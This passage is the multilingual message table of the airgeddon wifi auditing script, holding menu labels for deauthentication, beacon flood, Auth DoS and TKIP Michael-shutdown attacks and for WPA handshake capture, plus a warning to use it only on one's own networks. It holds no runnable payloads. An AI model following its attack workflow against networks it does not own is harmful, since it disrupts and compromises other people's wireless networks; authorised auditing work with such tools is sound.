	arr["catalan",50]="mode monitor requerit per atacs"
	arr["portuguese",50]="$pending_of_translation necessário no modo ataques monitor"

	arr["english",51]="5.  Deauth / disassoc amok mdk3 attack"
	arr["spanish",51]="5.  Ataque Deauth / Disassoc amok mdk3"
	arr["french",51]="5.  Attaque Deauth / Disassoc amok mdk3"
	arr["catalan",51]="5.  Atac Death /Disassoc amok mdk3"
	arr["portuguese",51]="5.  Ataque Deauth / Disassoc amok mdk3"

	arr["english",52]="6.  Deauth aireplay attack"
	arr["spanish",52]="6.  Ataque Deauth aireplay"
	arr["french",52]="6.  Attaque Deauth aireplay"
	arr["catalan",52]="6.  Atac Deauth aireplay"
	arr["portuguese",52]="6.  Ataque Deauth aireplay"

	arr["english",53]="7.  WIDS / WIPS / WDS Confusion attack"
	arr["spanish",53]="7.  Ataque WIDS / WIPS / WDS Confusion"
	arr["french",53]="7.  Attaque WIDS / WIPS / WDS Confusion"
	arr["catalan",53]="7.  Atac WIDS / WIPS / WDS Confusion"
	arr["portuguese",53]="$pending_of_translation 7.  Ataque WIDS / WIPS / Confusão WDS"

	arr["english",54]="old \"obsolete/non very effective\" attacks"
	arr["spanish",54]="antiguos ataques \"obsoletos/no muy efectivos\""
	arr["french",54]="anciennes attaques \"obsolètes/peu efficaces\""
	arr["catalan",54]="antics atacs \"obsolets/no gaire efectius\""
	arr["portuguese",54]="$pending_of_translation ataques antigos \"obsoleta/não muito eficaz\""

	arr["english",55]="2.  Put interface in monitor mode"
	arr["spanish",55]="2.  Poner la interfaz en modo monitor"
	arr["french",55]="2.  Passer l'interface en mode moniteur"
	arr["catalan",55]="2.  Configurar la interfície en mode monitor"
	arr["portuguese",55]="$pending_of_translation 2.  Coloque a interface em modo monitor"

	arr["english",56]="3.  Put interface in managed mode"
	arr["spanish",56]="3.  Poner la interfaz en modo managed"
	arr["french",56]="3.  Passer l'interface en mode managed"
	arr["catalan",56]="3.  Configurar la interfície en mode managed"
	arr["portuguese",56]="$pending_of_translation 3.  Coloque a interface de modo managed"

	arr["english",57]="6.  Put interface in monitor mode"
	arr["spanish",57]="6.  Poner el interfaz en modo monitor"
	arr["french",57]="6.  Passer l'interface en mode moniteur"
	arr["catalan",57]="6.  Configurar la interfície en mode monitor"
	arr["portuguese",57]="$pending_of_translation 6.  Coloque a interface em modo monitor"

	arr["english",58]="7.  Put interface in managed mode"
	arr["spanish",58]="7.  Poner el interfaz en modo managed"
	arr["french",58]="7.  Passer l'interface en mode managed"
	arr["catalan",58]="7.  Configurar la interfície en mode managed"
	arr["portuguese",58]="$pending_of_translation 7.  Coloque a interface de modo managed"

	arr["english",59]="11. Return to main menu"
	arr["spanish",59]="11. Volver al menú principal"
	arr["french",59]="11. Retourner au menu principal"
	arr["catalan",59]="11. Tornar al menú principal"
	arr["portuguese",59]="$pending_of_translation 11. Volte ao menu principal"

	arr["english",60]="8.  About & Credits"
	arr["spanish",60]="8.  Acerca de & Créditos"
	arr["french",60]="8.  A propos de & Crédits"
	arr["catalan",60]="8.  Sobre & Crédits"
	arr["portuguese",60]="$pending_of_translation 8.  Sobre & Créditos"

	arr["english",61]="10. Exit script"
	arr["spanish",61]="10. Salir del script"
	arr["french",61]="10. Sortir du script"
	arr["catalan",61]="10. Sortir del script"
	arr["portuguese",61]="$pending_of_translation 9.  Saia do script"

	arr["english",62]="8.  Beacon flood attack"
	arr["spanish",62]="8.  Ataque Beacon flood"
	arr["french",62]="8.  Attaque Beacon flood"
	arr["catalan",62]="8.  Atac Beacon flood"
	arr["portuguese",62]="8.  Ataque Beacon flood"

	arr["english",63]="9.  Auth DoS attack"
	arr["spanish",63]="9.  Ataque Auth DoS"
	arr["french",63]="9.  Attaque Auth DoS"
	arr["catalan",63]="9.  Atac Auth Dos"
	arr["portuguese",63]="9.  Ataque Auth DoS"

	arr["english",64]="10. Michael shutdown exploitation (TKIP) attack"
	arr["spanish",64]="10. Ataque Michael shutdown exploitation (TKIP)"
	arr["french",64]="10. Attaque Michael shutdown exploitation (TKIP)"
	arr["catalan",64]="10. Atac Michael shutdown exploitation (TKIP)"
	arr["portuguese",64]="$pending_of_translation 10. Ataque Michael shutdown exploitation (TKIP)"

	arr["english",65]="Exploring for targets option chosen (monitor mode needed)"
	arr["spanish",65]="Elegida opción de exploración para buscar objetivos (modo monitor requerido)"
	arr["french",65]="L'option de recherche des objectifs a été choisie (modo moniteur nécessaire)"
	arr["catalan",65]="Seleccionada opció d'exploració per buscar objectius (requerit mode monitor)"
	arr["portuguese",65]="$pending_of_translation Opção de digitalização selecionado para procurar objetivos (modo monitor obrigatório)"

	arr["english",66]="Selected interface $interface is in monitor mode. Exploration can be performed"
	arr["spanish",66]="La interfaz seleccionada $interface está en modo monitor. La exploración se puede realizar"
	arr["french",66]="L'interface choisie $interface est en mode moniteur. L'exploration des réseaux environnants peut s'effectuer"
	arr["catalan",66]="La interfície seleccionada $interface està en mode monitor. L'exploració es pot realitzar"
	arr["portuguese",66]="$pending_of_translation A interface selecionada $interface está no modo monitor. A verificação pode ser realizada"

	arr["english",67]="When started, press Ctrl+C to stop..."
	arr["spanish",67]="Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",67]="Une foi l'opération lancée, veuillez presser Ctrl+C pour l'arrêter..."
	arr["catalan",67]="Una vegada iniciat, polsi Ctrl+C per detenir-ho..."
	arr["portuguese",67]="$pending_of_translation Uma vez iniciado, pressione Ctrl+C para pará-lo..."

	arr["english",68]="No networks found"
	arr["spanish",68]="No se encontraron redes"
	arr["french",68]="Aucun réseau détecté"
	arr["catalan",68]="No s'han trobat xarxes"
	arr["portuguese",68]="$pending_of_translation Nenhuma rede encontrada"

	arr["english",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"
	arr["spanish",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["french",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["catalan",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["portuguese",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"

	arr["english",70]="Only one target detected. Autoselected"
	arr["spanish",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
	arr["french",70]="Un seul réseau a été détecté. Il a été automatiquement sélectionné"
	arr["catalan",70]="Només un objectiu detectat. Seleccionat automàticament"
	arr["portuguese",70]="$pending_of_translation Apenas um alvo detectado. Foi seleccionado automaticamente"

	arr["english",71]="(*) Network with clients"
	arr["spanish",71]="(*) Red con clientes"
	arr["french",71]="(*) Réseau avec clients"
	arr["catalan",71]="(*) Xarxa amb clients"
	arr["portuguese",71]="$pending_of_translation (*) Vermelho com clientes"

	arr["english",72]="Invalid target network was chosen"
	arr["spanish",72]="Red objetivo elegida no válida"
	arr["french",72]="Le choix du réseau cible est invalide"
	arr["catalan",72]="Xarxa de destí seleccionada no vàlida"
	arr["portuguese",72]="$pending_of_translation Rede alvo escolhido inválido"

	arr["english",73]="airgeddon script v$airgeddon_version developed by :"
	arr["spanish",73]="airgeddon script v$airgeddon_version programado por :"
	arr["french",73]="Le script airgeddon v$airgeddon_version a été programmé par :"
	arr["catalan",73]="airgeddon script v$airgeddon_version desenvolupat per :"
	arr["portuguese",73]="airgeddon script v$airgeddon_version programado por :"

	arr["english",74]="This script is under GPLv3 (or later) License"
	arr["spanish",74]="Este script está bajo Licencia GPLv3 (o posterior)"
	arr["french",74]="Script publié sous Licence GPLv3 (ou version supèrieure)"
	arr["catalan",74]="Aquest script està publicat sota llicència GPLv3 (o versió superior)"
	arr["portuguese",74]="$pending_of_translation Este script está sob licença GPLv3 (ou posterior)"

	arr["english",75]="Thanks to the \"Spanish pen testing crew\", to the \"Wifislax Staff\" and special thanks Kcdtv for beta testing and support received"
	arr["spanish",75]="Gracias al \"Spanish pen testing crew\", al \"Wifislax Staff\" y en especial a Kcdtv por el beta testing y el apoyo recibido"
	arr["french",75]="Merci au \"Spanish pen testing crew\" , au \"Wifislax Staff\" et au Kcdtv pour les tests en phase bêta et leur soutien"
	arr["catalan",75]="Gràcies al \"Spanish pen testing crew\", al \"Wifislax Staff\" i al Kcdtv per les proves beta i el recolzament rebut"
	arr["portuguese",75]="$pending_of_translation Graças à \"Spanish pen testing crew\" para \"Wifislax Staff\" e, especialmente, Kcdtv por meio de testes beta e apoio recebido"

	arr["english",76]="Invalid menu option was chosen"
	arr["spanish",76]="Opción del menú no válida"
	arr["french",76]="Option erronée"
	arr["catalan",76]="Opció del menú no vàlida"
	arr["portuguese",76]="$pending_of_translation Menu de opção inválida"

	arr["english",77]="Invalid interface was chosen"
	arr["spanish",77]="Interfaz no válida"
	arr["french",77]="L'interface choisie n'existe pas"
	arr["catalan",77]="Interfície no vàlida"
	arr["portuguese",77]="$pending_of_translation Interface inválida"

	arr["english",78]="9.  Change language"
	arr["spanish",78]="9.  Cambiar idioma"
	arr["french",78]="9.  Changer de langue"
	arr["catalan",78]="9.  Canviar l'idioma"
	arr["portuguese",78]="$pending_of_translation 9.  Alterar idioma"

	arr["english",79]="1.  English"
	arr["spanish",79]="1.  Inglés"
	arr["french",79]="1.  Anglais"
	arr["catalan",79]="1.  Anglés"
	arr["portuguese",79]="1.  Inglês"

	arr["english",80]="2.  Spanish"
	arr["spanish",80]="2.  Español"
	arr["french",80]="2.  Espagnol"
	arr["catalan",80]="2.  Espanyol"
	arr["portuguese",80]="2.  Espanhol"

	arr["english",81]="Select a language :"
	arr["spanish",81]="Selecciona un idioma :"
	arr["french",81]="Choisissez une langue :"
	arr["catalan",81]="Selecciona un idioma :"
	arr["portuguese",81]="$pending_of_translation Selecione um idioma :"

	arr["english",82]="Invalid language was chosen"
	arr["spanish",82]="Idioma no válido"
	arr["french",82]="Langue non valide"
	arr["catalan",82]="Idioma no vàlid"
	arr["portuguese",82]="$pending_of_translation Idioma inválido"

	arr["english",83]="Language changed to English"
	arr["spanish",83]="Idioma cambiado a Inglés"
	arr["french",83]="Le script sera maintenant en Anglais"
	arr["catalan",83]="Idioma canviat a Anglés"
	arr["portuguese",83]="$pending_of_translation Idioma alterado para Inglês"

	arr["english",84]="Language changed to Spanish"
	arr["spanish",84]="Idioma cambiado a Español"
	arr["french",84]="Le script sera maintenant en Espagnol"
	arr["catalan",84]="Idioma canviat a Espanyol"
	arr["portuguese",84]="$pending_of_translation Idioma alterado para Espanhol"

	arr["english",85]="Send me bugs or suggestions to $mail"
	arr["spanish",85]="Enviadme errores o sugerencias a $mail"
	arr["french",85]="Envoyer des erreurs ou des suggestions à $mail"
	arr["catalan",85]="Envieu-me errorrs o suggeriments a $mail"
	arr["portuguese",85]="$pending_of_translation Enviar erros ou sugestões para $mail"

	arr["english",86]="Welcome"
	arr["spanish",86]="Bienvenid@"
	arr["french",86]="Bienvenue"
	arr["catalan",86]="Benvingut"
	arr["portuguese",86]="Bem-vindo"

	arr["english",87]="Change language"
	arr["spanish",87]="Cambiar idioma"
	arr["french",87]="Changer de langue"
	arr["catalan",87]="Canviar d'idioma"
	arr["portuguese",87]="$pending_of_translation Mudar idioma"

	arr["english",88]="Interface selection"
	arr["spanish",88]="Selección de interfaz"
	arr["french",88]="Sélection de l'interface"
	arr["catalan",88]="Selecció de interfície"
	arr["portuguese",88]="$pending_of_translation Seleção de interface"

	arr["english",89]="Mdk3 amok action"
	arr["spanish",89]="Acción mdk3 amok"
	arr["french",89]="Action mdk3 amok"
	arr["catalan",89]="Acció mdk3 amok"
	arr["portuguese",89]="Acção mdk3 amok"

	arr["english",90]="Aireplay deauth action"
	arr["spanish",90]="Acción aireplay deauth"
	arr["french",90]="Action aireplay deauth"
	arr["catalan",90]="Acció aireplay deauth"
	arr["portuguese",90]="Acção deauth aireplay"

	arr["english",91]="WIDS / WIPS / WDS confusion action"
	arr["spanish",91]="Acción WIDS / WIPS / WDS confusion"
	arr["french",91]="Action WIDS / WIPS / WDS confusion"
	arr["catalan",91]="Acció WIDS / WIPS / WDS confusion"
	arr["portuguese",91]="Acção WIDS / WIPS / confusão WDS"

	arr["english",92]="Beacon flood action"
	arr["spanish",92]="Acción Beacon flood"
	arr["french",92]="Action Beacon flood"
	arr["catalan",92]="Acció Beacon flood"
	arr["portuguese",92]="Acção Beacon flood"

	arr["english",93]="Auth DoS action"
	arr["spanish",93]="Acción Auth DoS"
	arr["french",93]="Action Auth DoS"
	arr["catalan",93]="Acció Auth DoS"
	arr["portuguese",93]="Acção Auth DoS"

	arr["english",94]="Michael Shutdown action"
	arr["spanish",94]="Acción Michael Shutdown"
	arr["french",94]="Action Michael Shutdown"
	arr["catalan",94]="Acció Michael Shutdown"
	arr["portuguese",94]="Acção Michael Shutdown"

	arr["english",95]="Mdk3 amok parameters"
	arr["spanish",95]="Parámetros Mdk3 amok"
	arr["french",95]="Paramètres Mdk3 amok"
	arr["catalan",95]="Paràmetres Mdk3 amok"
	arr["portuguese",95]="Parâmetros Mdk3 amok"

	arr["english",96]="Aireplay deauth parameters"
	arr["spanish",96]="Parámetros Aireplay deauth"
	arr["french",96]="Paramètres Aireplay deauth"
	arr["catalan",96]="Paràmetres Aireplay deauth"
	arr["portuguese",96]="Parâmetros Aireplay deauth"

	arr["english",97]="WIDS / WIPS / WDS parameters"
	arr["spanish",97]="Parámetros WIDS / WIPS / WDS"
	arr["french",97]="Paramètres WIDS / WIPS / WDS"
	arr["catalan",97]="Paràmetres WIDS / WIPS / WDS"
	arr["portuguese",97]="Parâmetros WIDS / WIPS / WDS"

	arr["english",98]="Beacon flood parameters"
	arr["spanish",98]="Parámetros Beacon flood"
	arr["french",98]="Paramètres Beacon flood"
	arr["catalan",98]="Paràmetres Beacon flood"
	arr["portuguese",98]="Parâmetros Beacon flood"

	arr["english",99]="Auth DoS parameters"
	arr["spanish",99]="Parámetros Auth DoS"
	arr["french",99]="Paramètres Auth DoS"
	arr["catalan",99]="Paràmetres Auth DoS"
	arr["portuguese",99]="Parâmetros Auth DoS"

	arr["english",100]="Michael Shutdown parameters"
	arr["spanish",100]="Parámetros Michael Shutdown"
	arr["french",100]="Paramètres Michael Shutdown"
	arr["catalan",100]="Paràmetres Michael Shutdown"
	arr["portuguese",100]="Parâmetros Michael Shutdown"

	arr["english",101]="Airgeddon main menu"
	arr["spanish",101]="Menú principal airgeddon"
	arr["french",101]="Menu principal d'airgeddon"
	arr["catalan",101]="Menú principal airgeddon"
	arr["portuguese",101]="$pending_of_translation Airgeddon menu principal"

	arr["english",102]="DoS attacks menu"
	arr["spanish",102]="Menú ataques DoS"
	arr["french",102]="Menu des attaques DoS"
	arr["catalan",102]="Menú d'atacs DoS"
	arr["portuguese",102]="$pending_of_translation Menu de ataques DoS"

	arr["english",103]="Exploring for targets"
	arr["spanish",103]="Explorar para buscar objetivos"
	arr["french",103]="Détection pour trouver des cibles"
	arr["catalan",103]="Explorar per buscar objectius"
	arr["portuguese",103]="$pending_of_translation Navegue para localizar alvos"

	arr["english",104]="Select target"
	arr["spanish",104]="Seleccionar objetivo"
	arr["french",104]="Selection de l'objectif"
	arr["catalan",104]="Seleccionar objectiu"
	arr["portuguese",104]="$pending_of_translation Escolha um objetivo"

	arr["english",105]="About & Credits"
	arr["spanish",105]="Acerca de & Créditos"
	arr["french",105]="A propos de & Crédits"
	arr["catalan",105]="Sobre de & Crédits"
	arr["portuguese",105]="$pending_of_translation Sobre & Créditos"

	arr["english",106]="Exiting"
	arr["spanish",106]="Saliendo"
	arr["french",106]="Sortie du script"
	arr["catalan",106]="Sortint"
	arr["portuguese",106]="$pending_of_translation Partida"

	arr["english",107]="Join the project at $urlgithub"
	arr["spanish",107]="Únete al proyecto en $urlgithub"
	arr["french",107]="Rejoignez le projet : $urlgithub"
	arr["catalan",107]="Uneix-te al projecte a $urlgithub"
	arr["portuguese",107]="$pending_of_translation Junte-se o projeto de $urlgithub"

	arr["english",108]="Let's check if you have installed what script needs"
	arr["spanish",108]="Vamos a chequear si tienes instalado lo que el script requiere"
	arr["french",108]="Nous allons vérifier si les dépendances sont bien installées"
	arr["catalan",108]="Anem a verificar si tens instal·lat el que l'script requereix"
	arr["portuguese",108]="$pending_of_translation Vamos verificar se você tiver instalado o que o script exige"

	arr["english",109]="Essential tools: checking..."
	arr["spanish",109]="Herramientas esenciales: comprobando..."
	arr["french",109]="Vérification de la présence des outils nécessaires..."
	arr["catalan",109]="Eines essencials: comprovant..."
	arr["portuguese",109]="$pending_of_translation Ferramentas essenciais: a verificação..."

	arr["english",110]="Your distro has all necessary essential tools. Script can continue..."
	arr["spanish",110]="Tu distro tiene todas las herramientas esenciales necesarias. El script puede continuar..."
	arr["french",110]="Les outils essentiels nécessaires au bon fonctionnement du programme sont tous présents dans votre système. Le script peut continuer..."
	arr["catalan",110]="La teva distro té totes les eines essencials necessàries. El script pot continuar..."
	arr["portuguese",110]="$pending_of_translation Seu distro tem todas as ferramentas essenciais necessárias. O script pode continuar..."

	arr["english",111]="You need to install some essential tools before running this script"
	arr["spanish",111]="Necesitas instalar algunas herramientas esenciales antes de lanzar este script"
	arr["french",111]="Vous devez installer quelques programmes avant de pouvoir lancer ce script"
	arr["catalan",111]="Necessites instal·lar algunes eines essencials abans d'executar aquest script"
	arr["portuguese",111]="$pending_of_translation Você precisa instalar algumas ferramentas essenciais antes de lançar este script"

	arr["english",112]="Language changed to French"
	arr["spanish",112]="Idioma cambiado a Francés"
	arr["french",112]="Le script sera maintenant en Français"
	arr["catalan",112]="Llenguatge canviat a Francès"
	arr["portuguese",112]="$pending_of_translation Idioma alterado para Francês"

	arr["english",113]="3.  French"
	arr["spanish",113]="3.  Francés"
	arr["french",113]="3.  Français"
	arr["catalan",113]="3.  Francès"
	arr["portuguese",113]="3.  Francês"

	arr["english",114]="Use it only on your own networks!!"
	arr["spanish",114]="Utilízalo solo en tus propias redes!!"
	arr["french",114]="Utilisez-le seulement dans vos propres réseaux!!"
	arr["catalan",114]="Utilitza'l només a les teves pròpies xarxes!!"
	arr["portuguese",114]="$pending_of_translation Use-o apenas em suas próprias redes!!"

	arr["english",115]="Press [Enter] key to continue..."
	arr["spanish",115]="Pulsa la tecla [Enter] para continuar..."
	arr["french",115]="Pressez [Enter] pour continuer..."
	arr["catalan",115]="Prem la tecla [Enter] per continuar..."
	arr["portuguese",115]="Pressione a tecla [Enter] para continuar..."

	arr["english",116]="4.  Catalan"
	arr["spanish",116]="4.  Catalán"
	arr["french",116]="4.  Catalan"
	arr["catalan",116]="4.  Català"
	arr["portuguese",116]="4.  Catalão"

	arr["english",117]="Language changed to Catalan"
	arr["spanish",117]="Idioma cambiado a Catalán"
	arr["french",117]="Le script sera maintenant en Catalan"
	arr["catalan",117]="Idioma canviat a Català"
	arr["portuguese",117]="$pending_of_translation Idioma alterado para Catalão"

	arr["english",118]="4.  DoS attacks menu"
	arr["spanish",118]="4.  Menú de ataques DoS"
	arr["french",118]="4.  Menu des attaques DoS"
	arr["catalan",118]="4.  Menú d'atacs DoS"
	arr["portuguese",118]="$pending_of_translation 4.  Ataques DoS menu"

	arr["english",119]="5.  Handshake tools menu"
	arr["spanish",119]="5.  Menú de herramientas Handshake"
	arr["french",119]="5.  Menu des outils pour Handshake"
	arr["catalan",119]="5.  Menú d'eines Handshake"
	arr["portuguese",119]="$pending_of_translation 5.  Menu ferramentas do Handshake"

	arr["english",120]="Handshake tools menu"
	arr["spanish",120]="Menú de herramientas Handshake"
	arr["french",120]="Menu des outils pour Handshake"
	arr["catalan",120]="Menú d'eines Handshake"
	arr["portuguese",120]="$pending_of_translation Menu de ferramentas do Handshake"

	arr["english",121]="5.  Capture Handshake"
	arr["spanish",121]="5.  Capturar Handshake"
	arr["french",121]="5.  Capture du Handshake"
	arr["catalan",121]="5.  Captura Handshake"
	arr["portuguese",121]="$pending_of_translation 5.  Captura de Handshake"

	arr["english",122]="6.  Clean/optimize Handshake file"
	arr["spanish",122]="6.  Limpiar/optimizar fichero de Handshake"
	arr["french",122]="6.  Laver/optimiser le fichier Handshake"
	arr["catalan",122]="6.  Netejar/optimitzar fitxer de Handshake"
	arr["portuguese",122]="$pending_of_translation 6.  Limpar arquivo/optimize Handshake"

	arr["english",123]="7.  Return to main menu"
	arr["spanish",123]="7.  Volver al menú principal"
	arr["french",123]="7.  Retourner au menu principal"
	arr["catalan",123]="7.  Tornar al menú principal"
	arr["portuguese",123]="$pending_of_translation 7.  Volte ao menu principal"

	arr["english",124]="monitor mode needed for capturing"
	arr["spanish",124]="modo monitor requerido en captura"
	arr["french",124]="modo moniteur nécessaire pour la capture"
	arr["catalan",124]="mode monitor requerit en captura"
	arr["portuguese",124]="$pending_of_translation modo de captura do monitor necessário"

	arr["english",125]="There is no valid target network selected. You'll be redirected to select one"
	arr["spanish",125]="No hay una red objetivo válida seleccionada. Serás redirigido para seleccionar una"
	arr["french",125]="Le choix du réseau cible est incorrect. Vous allez être redirigé vers le menu de sélection pour effectuer un nouveau choix"
	arr["catalan",125]="No hi ha una xarxa objectiu vàlida seleccionada. Seràs redirigit per seleccionar una"
	arr["portuguese",125]="$pending_of_translation Sem válida uma rede de destino selecionado. Você será redirecionado para selecionar um"

	arr["english",126]="You have a valid WPA/WPA2 target network selected. Script can continue..."
	arr["spanish",126]="Tienes una red objetivo WPA/WPA2 válida seleccionada. El script puede continuar..."
	arr["french",126]="Choix du réseau cible WPA/WPA2 valide. Le script peut continuer..."
	arr["catalan",126]="Tens una xarxa objectiu WPA/WPA2 vàlida seleccionada. El script pot continuar..."
	arr["portuguese",126]="$pending_of_translation Você tem uma rede alvo WPA/WPA2 válido selecionado. O script pode continuar..."

	arr["english",127]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Capture Handshake"
	arr["spanish",127]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Captura Handshake"
	arr["french",127]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["catalan",127]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Captura Handshake"
	arr["portuguese",127]="$pending_of_translation A ordem natural para prosseguir neste menu é geralmente: 1-Escolha de 2-Ponla cartão wifi no modo monitor de 3-Selecionar rede objectivo 4-Capture Handshake"

	arr["english",128]="Select a wifi card to work in order to be able to do more actions than with an ethernet interface"
	arr["spanish",128]="Selecciona una interfaz wifi para poder realizar más acciones que con una interfaz ethernet"
	arr["french",128]="Veuillez sélectionner une carte wifi au lieu d'une carte ethernet afin d'être en mesure de réaliser plus d'actions"
	arr["catalan",128]="Seleccioneu una targeta wifi per treballar amb la finalitat de ser capaç de fer més accions que amb una interfície ethernet"
	arr["portuguese",128]="$pending_of_translation Selecione uma interface wifi para realizar mais ações do que com interface ethernet"

	arr["english",129]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Start attack"
	arr["spanish",129]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Comienza el ataque"
	arr["french",129]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["catalan",129]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Iniciar l'atac"
	arr["portuguese",129]="$pending_of_translation A ordem natural para prosseguir neste menu é geralmente: 1-Escolha de 2-Ponla cartão wifi no modo monitor 3-Escolha rede alvo de 4-Começa o ataque"

	arr["english",130]="Remember to select a target network with clients to capture Handshake"
	arr["spanish",130]="Recuerda seleccionar una red objetivo con clientes para capturar el Handshake"
	arr["french",130]="Rappelez-vous de sélectionner un réseau cible avec un/des client(s) connecté(s) pour pouvoir capturer un Handshake"
	arr["catalan",130]="Recorda que has de seleccionar una xarxa de destinació amb clients per capturar el Handshake"
	arr["portuguese",130]="$pending_of_translation Lembre-se de selecionar uma rede de destino com os clientes para capturar o Handshake"

	arr["english",131]="Not all attacks affect all access points. If an attack is not working against an access point, choose another one :)"
	arr["spanish",131]="No todos los ataques afectan a todos los puntos de acceso. Si un ataque no funciona contra un punto de acceso, elige otro :)"
	arr["french",131]="Toutes les attaques n'affectent pas les points d'accès de la même manière. Si une attaque ne donne pas de résultats, choisissez en une autre :)"
	arr["catalan",131]="No tots els atacs afecten tots els punts d'accés. Si un atac no està treballant cap a un punt d'accés, tria un altre :)"
	arr["portuguese",131]="$pending_of_translation Nem todos os ataques afetam todos os pontos de acesso. Se um ataque não funciona contra um ponto de acesso, escolha outro :)"

	arr["english",132]="Cleaning a Handshake file is recommended only for big size files. It's better to have a backup, sometimes file can be corrupted while cleaning it"
	arr["spanish",132]="Limpiar un fichero de Handshake se recomienda solo para ficheros grandes. Es mejor hacer una copia de seguridad antes, a veces el fichero se puede corromper al limpiarlo"
	arr["french",132]="Épurer le fichier contenant le Handshake est seulement recommandable si le fichier est volumineux. Si vous décidez d'épurer le fichier il est conseillé de faire une copie de sauvegarde du fichier originel, l'opération de nettoyage comporte des risques et peut le rendre illisible"
	arr["catalan",132]="Netejar un fitxer de Handshake es recomana només per a fitxers grans. És millor fer una còpia de seguretat abans, de vegades el fitxer es pot corrompre al netejar-lo"
	arr["portuguese",132]="$pending_of_translation Você limpar um Handshake arquivo é recomendado apenas para arquivos grandes. Melhor fazer um backup antes de, por vezes, o arquivo pode corromper a limpo"

	arr["english",133]="If you select a target network with hidden ESSID, you can't use it, but you can perform BSSID based attacks to that network"
	arr["spanish",133]="Si seleccionas una red objetivo con el ESSID oculto, no podrás usarlo, pero puedes hacer ataques basados en BSSID sobre esa red"
	arr["french",133]="Si vous sélectionnez un réseau cible avec un ESSID caché, vous n'allez pas pouvoir utiliser l'ESSID pour attaquer, mais vous pourrez effectuer les attaques basées sur le BSSID du réseau"
	arr["catalan",133]="Si selecciones una xarxa objectiu amb el ESSID ocult, no podràs usar-lo, però pots fer atacs basats en BSSID sobre aquesta xarxa"
	arr["portuguese",133]="$pending_of_translation Se você selecionar uma rede alvo com ESSID oculto, você não pode usá-lo, mas você pode fazer ataques com base no que BSSID rede"

	arr["english",134]="If your Linux is a virtual machine, it is possible that integrated wifi cards are detected as ethernet. Use an external usb wifi card"
	arr["spanish",134]="Si tu Linux es una máquina virtual, es posible que las tarjetas wifi integradas sean detectadas como ethernet. Utiliza una tarjeta wifi externa usb"
	arr["french",134]="Si votre système d'exploitation Linux est lancé dans une machine virtuelle, il est probable que les cartes wifi internes soient détectées comme des cartes ethernet. Il vaut mieux dans ce cas utiliser un dispositif wifi usb"
	arr["catalan",134]="Si el teu Linux és a una màquina virtual, és possible que les targetes wifi integrades siguin detectades com ethernet. Utilitza una targeta wifi externa usb"
	arr["portuguese",134]="$pending_of_translation Se o Linux é uma máquina virtual, é possível que as placas wireless integradas são detectados como ethernet. Usa um usb placa wifi externa"

	arr["english",135]="Type of encryption: "${pink_color}"$enc"${normal_color}
	arr["spanish",135]="Tipo de encriptado: "${pink_color}"$enc"${normal_color}
	arr["french",135]="Type de chiffrement: "${pink_color}"$enc"${normal_color}
	arr["catalan",135]="Tipus d'encriptat: "${pink_color}"$enc"${normal_color}
	arr["portuguese",135]="$pending_of_translation Tipo de criptografia: "${pink_color}"$enc"${normal_color}

	arr["english",136]="Obtaining a Handshake is only for networks with encryption WPA or WPA2"
	arr["spanish",136]="La obtención de un Handshake es solo para redes con encriptación WPA o WPA2"
	arr["french",136]="L'obtention d'un Handshake est seulement possible sur des réseaux protégés par chiffrement WPA ou WPA2"
	arr["catalan",136]="L'obtenció d'un Handshake és només per a xarxes amb encriptació WPA o WPA2"
	arr["portuguese",136]="$pending_of_translation A obtenção de um Handshake é apenas para redes com criptografia WPA ou WPA2"

	arr["english",137]="The selected network is invalid. To get a Handshake, encryption type of target network should be WPA or WPA2"
	arr["spanish",137]="La red seleccionada no es válida. Para obtener un Handshake, el tipo de encriptación de la red objetivo debe ser WPA o WPA2"
	arr["french",137]="Le réseau sélectionné est invalide . Pour obtenir un Handshake le réseau cible doit être en WPA ou WPA2"
	arr["catalan",137]="La xarxa seleccionada no és vàlida. Per obtenir un Handshake, el tipus d'encriptació de la xarxa objectiu ha de ser WPA o WPA2"
	arr["portuguese",137]="$pending_of_translation A rede selecionada é inválida. Para obter um Handshake, o tipo de criptografia da rede de destino deve ser WPA ou WPA2"

	arr["english",138]="Attack for Handshake"
	arr["spanish",138]="Ataque para Handshake"
	arr["french",138]="Attaque pour obtenir un Handshake"
	arr["catalan",138]="Atac de Handshake"
	arr["portuguese",138]="$pending_of_translation Ataque de Handshake"

	arr["english",139]="1.  Deauth / disassoc amok mdk3 attack"
	arr["spanish",139]="1.  Ataque Deauth / Disassoc amok mdk3"
	arr["french",139]="1.  Attaque Deauth / Disassoc amok mdk3"
	arr["catalan",139]="1.  Atac Deauth / Disassoc amok mdk3"
	arr["portuguese",139]="1.  Ataque Deauth / Disassoc amok mdk3"

	arr["english",140]="2.  Deauth aireplay attack"
	arr["spanish",140]="2.  Ataque Deauth aireplay"
	arr["french",140]="2.  Attaque Deauth aireplay"
	arr["catalan",140]="2.  Atac Deauth aireplay"
	arr["portuguese",140]="2.  Ataque Deauth aireplay"

	arr["english",141]="3.  WIDS / WIPS / WDS Confusion attack"
	arr["spanish",141]="3.  Ataque WIDS / WIPS / WDS Confusion"
	arr["french",141]="3.  Attaque WIDS / WIPS / WDS Confusion"
	arr["catalan",141]="3.  Atac WIDS / WIPS / WDS Confusion"
	arr["portuguese",141]="3.  Ataque WIDS / WIPS / Confusão WDS"

	arr["english",142]="If the Handshake doesn't appear after an attack, try again or change the type of attack"
